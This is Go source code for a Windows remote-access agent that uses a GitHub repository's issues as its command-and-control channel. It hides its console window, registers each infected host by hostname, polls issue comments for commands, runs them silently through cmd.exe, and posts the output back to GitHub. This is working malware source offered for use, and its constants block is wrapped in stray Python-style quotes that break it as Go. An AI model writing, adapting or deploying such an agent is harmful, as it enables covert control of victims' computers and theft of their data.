package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"github.com/google/uuid"
	"golang.org/x/sys/windows"
)
""" Change the token and username
const (
	githubToken = ""
	repoName    = "Akilan-kj/C2"
	logFile     = "agent.log"
)
"""
var (
	agentID     string
	issueNumber int
	jobHandle   windows.Handle
)

// **1️⃣ Hide Console Window**
func hideConsole() {
	mod := syscall.NewLazyDLL("kernel32.dll")
	getConsoleWindow := mod.NewProc("GetConsoleWindow")
	consoleWindow, _, _ := getConsoleWindow.Call()
	if consoleWindow != 0 {
		user32 := syscall.NewLazyDLL("user32.dll")
		showWindow := user32.NewProc("ShowWindow")
		showWindow.Call(consoleWindow, uintptr(0)) // SW_HIDE = 0
	}
}

// **2️⃣ Create Windows Job Object with Process Termination Monitoring**
func createJobObject() {
	var err error
	jobHandle, err = windows.CreateJobObject(nil, nil)
	if err != nil {
		log.Fatalf("❌ Failed to create job object: %v", err)
	}

	// Enforce process termination when job object is closed
	var info windows.JOBOBJECT_EXTENDED_LIMIT_INFORMATION
	info.BasicLimitInformation.LimitFlags = windows.JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE
	_, err = windows.SetInformationJobObject(jobHandle, windows.JobObjectExtendedLimitInformation,
		uintptr(unsafe.Pointer(&info)), uint32(unsafe.Sizeof(info)))
	if err != nil {
		log.Fatalf("❌ Failed to set job object information: %v", err)
	}

	// Assign the current process to the job object
	self := windows.CurrentProcess() // ✅ Fixed: Correct function call
	err = windows.AssignProcessToJobObject(jobHandle, self)
	if err != nil {
		log.Fatalf("❌ Failed to assign process to job object: %v", err)
	}

	log.Println("🔒 Agent is now protected by a Windows Job Object.")
}

// **3️⃣ Register Agent with GitHub**
func registerAgent() {
	hostname, _ := os.Hostname()
	agentID = uuid.New().String()

	payload := map[string]string{
		"title": fmt.Sprintf("Agent Registered: %s | %s", hostname, agentID),
		"body":  "Agent is now active and awaiting commands.",
	}
	issueNumber = createGitHubIssue(payload)

	if issueNumber == 0 {
		log.Fatal("❌ Failed to register agent.")
	}
	log.Printf("✅ Agent Registered: %s | %s\n", hostname, agentID)
}

// **4️⃣ Create GitHub Issue**
func createGitHubIssue(payload map[string]string) int {
	url := fmt.Sprintf("https://api.github.com/repos/%s/issues", repoName)
	data, _ := json.Marshal(payload)
	req, _ := http.NewRequest("POST", url, bytes.NewBuffer(data))
	req.Header.Set("Authorization", "token "+githubToken)
	req.Header.Set("Accept", "application/vnd.github.v3+json")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		log.Println("❌ Failed to create issue:", err)
		return 0
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusCreated {
		body, err := io.ReadAll(resp.Body)
		if err != nil {
			log.Println("❌ Failed to read response body:", err)
			return 0
		}
		var result map[string]interface{}
		if err := json.Unmarshal(body, &result); err != nil {
			log.Println("❌ Failed to unmarshal response:", err)
			return 0
		}
		return int(result["number"].(float64))
	}
	log.Println("❌ GitHub issue creation failed. Status:", resp.Status)
	return 0
}

// **5️⃣ Fetch & Execute Commands from GitHub**
var lastProcessedCommentID int

func executeCommands() {
	for {
		url := fmt.Sprintf("https://api.github.com/repos/%s/issues/%d/comments", repoName, issueNumber)
		req, _ := http.NewRequest("GET", url, nil)
		req.Header.Set("Authorization", "token "+githubToken)
		req.Header.Set("Accept", "application/vnd.github.v3+json")

		client := &http.Client{}
		resp, err := client.Do(req)
		if err != nil {
			log.Println("❌ Failed to fetch commands:", err)
			time.Sleep(5 * time.Second) // Wait before retrying
			continue
		}

		// Read and close the response body immediately
		body, err := io.ReadAll(resp.Body)
		resp.Body.Close() // Close explicitly instead of defer
		if err != nil {
			log.Println("❌ Failed to read response body:", err)
			time.Sleep(5 * time.Second) // Wait before retrying
			continue
		}

		var comments []map[string]interface{}
		if err := json.Unmarshal(body, &comments); err != nil {
			log.Println("❌ Failed to unmarshal comments:", err)
			time.Sleep(5 * time.Second) // Wait before retrying
			continue
		}

		// Process only new comments
		for _, comment := range comments {
			commentID := int(comment["id"].(float64))
			commentBody := comment["body"].(string)

			// Ignore already processed comments
			if commentID <= lastProcessedCommentID {
				continue
			}

			// Update last processed comment ID
			lastProcessedCommentID = commentID

			// Check if the comment is a command
			if strings.HasPrefix(commentBody, "Command: ") {
				extractedCommand := strings.TrimPrefix(commentBody, "Command: ")
				log.Printf("✅ Extracted Command: %s\n", extractedCommand)
				executeCommand(extractedCommand)
			} else {
				log.Println("⚠ Ignoring response comment.")
			}
		}

		time.Sleep(5 * time.Second) // Poll every 5 seconds
	}
}

// **6️⃣ Execute the Received Command (PowerShell)**
func executeCommand(command string) {
	log.Printf("⚡ Executing: %s\n", command)

	// Use "cmd.exe" with Windows hidden process flag
	cmd := exec.Command("cmd", "/C", command)

	// ✅ Prevents console window from appearing
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &out

	err := cmd.Run()
	output := out.String()

	if err != nil {
		output += fmt.Sprintf("\n❌ Execution failed: %v", err)
	}

	if strings.TrimSpace(output) == "" {
		output = "(No Output)"
	}

	sendOutput(output)
}

// **7️⃣ Send Output to GitHub**
func sendOutput(output string) {
	url := fmt.Sprintf("https://api.github.com/repos/%s/issues/%d/comments", repoName, issueNumber)
	commentPayload := map[string]string{"body": fmt.Sprintf("```\n%s\n```", output)}
	data, _ := json.Marshal(commentPayload)

	req, _ := http.NewRequest("POST", url, bytes.NewBuffer(data))
	req.Header.Set("Authorization", "token "+githubToken)
	req.Header.Set("Accept", "application/vnd.github.v3+json")

	client := &http.Client{}
	_, err := client.Do(req)
	if err != nil {
		log.Println("❌ Failed to send command output:", err)
	}
}

// **🔟 Main Function**
func main() {
	hideConsole()

	logFile, err := os.OpenFile(logFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Fatalf("❌ Failed to open log file: %v", err)
	}
	defer logFile.Close()
	log.SetOutput(logFile)

	createJobObject()
	registerAgent()

	signalChannel := make(chan os.Signal, 1)
	signal.Notify(signalChannel, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-signalChannel
		sendOutput("Agent shutting down...")
		os.Exit(0)
	}()

	executeCommands()
}
